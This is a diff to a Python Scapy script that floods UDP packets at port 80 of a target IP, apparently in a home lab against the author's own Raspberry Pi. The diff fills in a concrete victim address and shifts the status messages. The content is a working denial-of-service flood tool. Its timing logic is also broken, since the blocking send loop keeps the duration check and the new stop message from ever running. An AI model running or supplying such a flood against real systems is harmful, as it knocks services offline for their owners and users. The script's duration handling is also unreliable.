@@ -4,7 +4,7 @@ from scapy.all import send, IP, UDP, RandShort
 import time
 
 # --- Configuration ---
-VICTIM_IP = "YOUR_RASPBERRY_PI_IP"  # <<< IMPORTANT: Change this!
+VICTIM_IP = "192.168.0.126" 
 TARGET_PORT = 80
 ATTACK_DURATION_SECONDS = 30 # Run the attack for 30 seconds
 
@@ -21,14 +21,12 @@ def udp_flood(target_ip, target_port, duration):
     try:
         # The send function in Scapy has a built-in loop option
         # 'loop=1' will send continuously, 'verbose=0' keeps the console clean
+        print("Attack running. Press Ctrl+C to stop.")
         send(packet, loop=1, verbose=0)
         
-        # This is a simple way to control duration; a more robust script would use threads.
-        # For this simple script, you will need to stop it manually with Ctrl+C.
-        print("Attack running. Press Ctrl+C to stop.")
         while time.time() < end_time:
             time.sleep(1)
-
+        print("Attack Stopped.....")
     except KeyboardInterrupt:
         print("\nAttack stopped.")
 
